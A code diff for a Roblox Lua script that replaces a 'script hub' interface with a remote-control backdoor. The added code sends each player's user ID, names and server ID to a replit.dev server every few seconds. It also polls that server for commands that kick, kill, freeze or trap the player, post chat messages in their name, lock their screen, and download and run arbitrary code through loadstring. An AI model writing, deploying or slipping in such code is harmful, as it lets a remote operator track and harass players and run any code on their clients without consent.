@@ -1,147 +1,208 @@
-local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
+--==============================================================================
+--|| CONFIGURATION
+--==============================================================================
+-- [!] CONFIGURE THESE URLS TO MATCH YOUR WEB SERVER
+local SERVER_READ_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/read"
+local SERVER_SEND_URL  = "https://8775b734-9c08-4b7f-932a-e8df8538b275-00-1xt67y1hms2uu.kirk.replit.dev/send"
+
+-- [!] TIMING CONFIGURATION
+local HEARTBEAT_INTERVAL = 3 -- How often (in seconds) to send status to the server.
+local POLL_INTERVAL = 0.3    -- How often to check for new commands.
+
+--==============================================================================
+--|| SERVICES
+--==============================================================================
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Setup PlayerGui
-local player = Players.LocalPlayer
-local PlayerGui = player:WaitForChild("PlayerGui", 5)
-if not PlayerGui then
-    warn("PlayerGui not found!")
-    return
-end
+--==============================================================================
+--|| STATE & HELPERS
+--==============================================================================
+local lastCount = 0
+local activeLocalConnections = {}
+local gameName = "Unknown Game"
+local function safeHttpGet(url) local ok, res = pcall(function() return game:HttpGet(url) end); if ok and res then return true, res end; return false, res end
+local function safeJsonDecode(s) local ok, res = pcall(function() return HttpService:JSONDecode(s) end); if ok then return res end; return nil end
 
--- Create Intro GUI
-local IntroGui = Instance.new("ScreenGui")
-IntroGui.Name = "DioIntroGui"
-IntroGui.Parent = PlayerGui
+task.spawn(function()
+	local success, result = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+	if success and result and result.Name then
+		gameName = result.Name
+	end
+end)
 
-local IntroFrame = Instance.new("Frame")
-IntroFrame.Parent = IntroGui
-IntroFrame.BackgroundTransparency = 1
-IntroFrame.Position = UDim2.new(0.5, -100, 0.5, -100)
-IntroFrame.Size = UDim2.new(0, 200, 0, 200)
-IntroFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+--==============================================================================
+--|| COMMAND ACTIONS
+--==============================================================================
+local Commands = {
+	["rejoin"] = function()
+		pcall(function()
+			-- 1. Set the reinjection flag. This is the "sticky note" that the loader will find.
+			TeleportService:SetTeleportSetting("AdminSystemReinject", true)
+			
+			-- 2. Teleport the player to the current server instance.
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+		end)
+	end,
 
-local LeftBracket = Instance.new("TextLabel")
-LeftBracket.Parent = IntroFrame
-LeftBracket.BackgroundTransparency = 1
-LeftBracket.Size = UDim2.new(0, 50, 0, 100)
-LeftBracket.Position = UDim2.new(0, -50, 0, 50)
-LeftBracket.Text = "["
-LeftBracket.TextColor3 = Color3.fromRGB(0, 255, 200)
-LeftBracket.TextSize = 100
-LeftBracket.Font = Enum.Font.Code
-LeftBracket.TextTransparency = 1
+	["joinme"] = function(args)
+		local jobId = args and args[1]
+		if jobId and jobId ~= "" then
+			pcall(TeleportService.TeleportToPlaceInstance, TeleportService, game.PlaceId, jobId, LocalPlayer)
+		end
+	end,
 
-local DTText = Instance.new("TextLabel")
-DTText.Parent = IntroFrame
-DTText.BackgroundTransparency = 1
-DTText.Size = UDim2.new(0, 100, 0, 100)
-DTText.Position = UDim2.new(0, 50, 0, 50)
-DTText.Text = "DT"
-DTText.TextColor3 = Color3.fromRGB(0, 255, 200)
-DTText.TextSize = 100
-DTText.Font = Enum.Font.Code
-DTText.TextTransparency = 1
+	["blockchat"] = function()
+		pcall(function()
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+		end)
+	end,
 
-local RightBracket = Instance.new("TextLabel")
-RightBracket.Parent = IntroFrame
-RightBracket.BackgroundTransparency = 1
-RightBracket.Size = UDim2.new(0, 50, 0, 100)
-RightBracket.Position = UDim2.new(0, 200, 0, 50)
-RightBracket.Text = "]"
-RightBracket.TextColor3 = Color3.fromRGB(0, 255, 200)
-RightBracket.TextSize = 100
-RightBracket.Font = Enum.Font.Code
-RightBracket.TextTransparency = 1
+	["unblockchat"] = function()
+		pcall(function()
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+		end)
+	end,
 
--- Create Main GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "DioScriptHub"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Enabled = false
-ScreenGui.Parent = PlayerGui
+	["sendchat"] = function(args)
+		local msg = args and args[1]
+		if msg and msg ~= "" then
+			pcall(function()
+				local textChatService = game:GetService("TextChatService")
+				if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local generalChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
+					if generalChannel then
+						generalChannel:SendAsync(msg)
+						return
+					end
+				end
+				local sayMessageRequest = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
+				if sayMessageRequest then sayMessageRequest = sayMessageRequest:FindFirstChild("SayMessageRequest") end
+				if sayMessageRequest then sayMessageRequest:FireServer(msg, "All") else LocalPlayer:Chat(msg) end
+			end)
+		end
+	end,
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 30)
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
-MainFrame.Size = UDim2.new(0, 400, 0, 300)
-MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-MainFrame.Active = true
-MainFrame.Draggable = true
-MainFrame.BackgroundTransparency = 1
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 10)
-UICorner.Parent = MainFrame
+	["kill"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+			LocalPlayer.Character.Humanoid.Health = 0
+		end
+	end,
 
--- Glow Effect
-local Glow = Instance.new("ImageLabel")
-Glow.Parent = MainFrame
-Glow.BackgroundTransparency = 1
-Glow.Size = UDim2.new(1, 20, 1, 20)
-Glow.Position = UDim2.new(0, -10, 0, -10)
-Glow.Image = "rbxassetid://1234567890" -- Replace with glow asset ID
-Glow.ImageTransparency = 0.5
-Glow.ZIndex = -1
+	["kick"] = function(args)
+		local message = (args and args[1]) or "Kicked by Admin"
+		pcall(function() LocalPlayer:Kick(message) end)
+	end,
 
--- UI Elements
-local Title = Instance.new("TextLabel")
-Title.Parent = MainFrame
-Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "[DT] Dio's Script Hub"
-Title.TextColor3 = Color3.fromRGB(0, 255, 200)
-Title.TextSize = 26
-Title.Font = Enum.Font.Code
+	["freeze"] = function()
+		if LocalPlayer.Character then
+			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = true end)
+				end
+			end
+		end
+	end,
 
-local CloseButton = Instance.new("TextButton")
-CloseButton.Parent = MainFrame
-CloseButton.Position = UDim2.new(1, -35, 0, 5)
-CloseButton.Size = UDim2.new(0, 30, 0, 30)
-CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.fromRGB(255, 50, 50)
-CloseButton.BackgroundColor3 = Color3.fromRGB(40, 45, 50)
-CloseButton.BackgroundTransparency = 0.3
+	["unfreeze"] = function()
+		if LocalPlayer.Character then
+			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+				if part:IsA("BasePart") then
+					pcall(function() part.Anchored = false end)
+				end
+			end
+		end
+	end,
 
-local Dropdown = Instance.new("TextButton")
-Dropdown.Parent = MainFrame
-Dropdown.Position = UDim2.new(0, 10, 0, 50)
-Dropdown.Size = UDim2.new(0, 380, 0, 35)
-Dropdown.Text = "Select a Script"
-Dropdown.TextColor3 = Color3.fromRGB(200, 255, 255)
-Dropdown.BackgroundColor3 = Color3.fromRGB(30, 35, 40)
-Dropdown.BackgroundTransparency = 0.2
-local DropdownCorner = Instance.new("UICorner")
-DropdownCorner.CornerRadius = UDim.new(0, 8)
-DropdownCorner.Parent = Dropdown
+	["stopgame"] = function()
+		if CoreGui:FindFirstChild("StopGameOverlay") then return end
+		local overlay = Instance.new("ScreenGui")
+		overlay.Name = "StopGameOverlay"; overlay.ResetOnSpawn = false; overlay.IgnoreGuiInset = true; overlay.Parent = CoreGui
+		local block = Instance.new("Frame", overlay)
+		block.Size = UDim2.new(2, 0, 2, 0); block.Position = UDim2.new(-0.5, 0, -0.5, 0); block.BackgroundTransparency = 1; block.Active = true; block.ZIndex = 9e9
+		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+		activeLocalConnections["StopGame"] = UserInputService.InputBegan:Connect(function() end)
+	end,
 
-local ScriptListFrame = Instance.new("Frame")
-ScriptListFrame.Parent = MainFrame
-ScriptListFrame.BackgroundColor3 = Color3.fromRGB(25, 30, 35)
-ScriptListFrame.Position = UDim2.new(0, 10, 0, 90)
-ScriptListFrame.Size = UDim2.new(0, 380, 0, 0)
-ScriptListFrame.BackgroundTransparency = 0.2
-ScriptListFrame.Visible = false
-local ListCorner = Instance.new("UICorner")
-ListCorner.CornerRadius = UDim.new(0, 8)
-ListCorner.Parent = ScriptListFrame
-local UIListLayout = Instance.new("UIListLayout")
-UIListLayout.Parent = ScriptListFrame
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	["resumegame"] = function()
+		if CoreGui:FindFirstChild("StopGameOverlay") then CoreGui.StopGameOverlay:Destroy() end
+		if activeLocalConnections["StopGame"] then activeLocalConnections["StopGame"]:Disconnect(); activeLocalConnections["StopGame"] = nil end
+		pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
+	end,
 
-local ExecuteButton = Instance.new("TextButton")
-ExecuteButton.Parent = MainFrame
-ExecuteButton.Position = UDim2.new(0, 10, 0, 255)
-ExecuteButton.Size = UDim2.new(0, 380, 0, 35)
-ExecuteButton.Text = "Execute [DT]"
-ExecuteButton.TextColor3 = Color3.fromRGB(0, 255, 100)
-ExecuteButton.BackgroundColor3 = Color3.fromRGB(25, 30, 35)
-ExecuteButton.BackgroundTransparency = 0.2
-local ExecuteCorner = Instance.new("UICorner")
-ExecuteCorner.CornerRadius = UDim.new(0, 8)
-ExecuteCorner.Parent = ExecuteButton
+	["jail"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+			local jailName = "TheBox_" .. LocalPlayer.UserId
+			if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
+			local JailModel = Instance.new("Model", workspace); JailModel.Name = jailName
+			local hrp = LocalPlayer.Character.PrimaryPart; local pos = hrp.Position; local size = 12; local wallSize = 0.5; local half = size / 2
+			local wallData = {{"Floor", Vector3.new(size, wallSize, size), pos - Vector3.new(0, half, 0)}, {"Ceiling", Vector3.new(size, wallSize, size), pos + Vector3.new(0, half, 0)}, {"Back", Vector3.new(size, size, wallSize), pos - Vector3.new(0, 0, half)}, {"Front", Vector3.new(size, size, wallSize), pos + Vector3.new(0, 0, half)}, {"Left", Vector3.new(wallSize, size, size), pos - Vector3.new(half, 0, 0)}, {"Right", Vector3.new(wallSize, size, size), pos + Vector3.new(half, 0, 0)}}
+			for _, data in ipairs(wallData) do local wall = Instance.new("Part", JailModel); wall.Size = data[2]; wall.Position = data[3]; wall.Anchored = true; wall.CanCollide = true; wall.BrickColor = BrickColor.Red(); wall.Material = Enum.Material.Neon; wall.Transparency = 0.6 end
+			hrp.CFrame = CFrame.new(pos)
+		end
+	end,
 
-local Spinner = Instance.new("ImageLabel")
-Spinner.Parent = MainFrame
-Spi
+	["unjail"] = function()
+		local jailName = "TheBox_" .. LocalPlayer.UserId
+		if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
+	end,
+
+	["kidnap"] = function()
+		if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+			local vanName = "UnmarkedVan_" .. LocalPlayer.UserId
+			if workspace:FindFirstChild(vanName) then workspace[vanName]:Destroy() end
+			local hrp = LocalPlayer.Character.PrimaryPart; hrp.Anchored = true
+			local van = Instance.new("Part", workspace); van.Name = vanName; van.Size = Vector3.new(16, 8, 9); van.Color = Color3.fromRGB(30, 30, 30); van.Material = Enum.Material.Metal; van.CFrame = hrp.CFrame * CFrame.new(0, -2, 40); van.Anchored = true
+			local sound = Instance.new("Sound", van); sound.SoundId = "rbxassetid://5150874039"; sound.Volume = 8; sound.Looped = true; sound:Play()
+			local tween = TweenService:Create(van, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {CFrame = hrp.CFrame * CFrame.new(0, -2, 4)}); tween:Play(); tween.Completed:Wait()
+			local weld = Instance.new("WeldConstraint", van); weld.Part0 = van; weld.Part1 = hrp; hrp.Anchored = false
+			local destination = van.CFrame * CFrame.new(0, 350, 0)
+			local depart = TweenService:Create(van, TweenInfo.new(3, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {CFrame = destination}); depart:Play()
+			Debris:AddItem(van, 4)
+		end
+	end,
+
+	["um"] = function(args)
+		local msg = args and args[1] or "Message"; local dur = (args and tonumber(args[2])) or 5
+		local gui = Instance.new("ScreenGui"); gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true; gui.Parent = CoreGui
+		local lbl = Instance.new("TextLabel", gui); lbl.Size = UDim2.new(0.8,0,0,80); lbl.AnchorPoint = Vector2.new(0.5,0); lbl.Position = UDim2.new(0.5,0,0.12,0); lbl.BackgroundTransparency = 1; lbl.Font = Enum.Font.SourceSansBold; lbl.TextSize = 36; lbl.TextColor3 = Color3.new(1,1,1); lbl.TextStrokeColor3 = Color3.new(0,0,0); lbl.TextStrokeTransparency = 0; lbl.Text = msg; lbl.TextTransparency = 1
+		for t=1,0,-0.1 do lbl.TextTransparency = t; task.wait(0.03) end
+		task.wait(dur)
+		for t=0,1,0.1 do lbl.TextTransparency = t; task.wait(0.03) end
+		gui:Destroy()
+	end,
+
+	["use"] = function(args)
+		local url = args and args[1]
+		if not url or url == "" then return end
+		local ok, src = pcall(function() return game:HttpGet(url) end)
+		if ok and src then local func, err = loadstring(src); if func then pcall(func) end end
+	end
+}
+
+--==============================================================================
+--|| HEARTBEAT SENDER
+--==============================================================================
+task.spawn(function()
+	while true do
+		local payload = {userId = LocalPlayer.UserId, name = LocalPlayer.Name, displayName = LocalPlayer.DisplayName, jobId = game.JobId, ts = os.time(), gameName = gameName}
+		local ok, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
+		if ok then pcall(function() game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload)) end) end
+		task.wait(HEARTBEAT_INTERVAL)
+	end
+end)
+
+--==============================================================================
+--|| COMMAND LISTENER
+--==============================================================================
+pcall(function() local ok, resp = safeHttpGet(SERVER_READ_URL); if ok then local dec = safeJsonDecode(resp); if type(dec) == "table" then lastCount = #dec end end end)
+task.spawn(function() while true do local ok, resp = safeHttpGet(SERVER_READ_URL); if ok and resp then local data = safeJsonDecode(resp); if type(data) == "table" and #data > lastCount then for idx = lastCount + 1, #data do local cmdData = safeJsonDecode(data[idx] or ""); if type(cmdData) == "table" and cmdData.cmd and cmdData.target then local commandFunc = Commands[cmdData.cmd:lower()]; if commandFunc and (cmdData.target == LocalPlayer.UserId or cmdData.target == "all") then pcall(commandFunc, cmdData.args) end end end; lastCount = #data end end; task.wait(POLL_INTERVAL) end end)
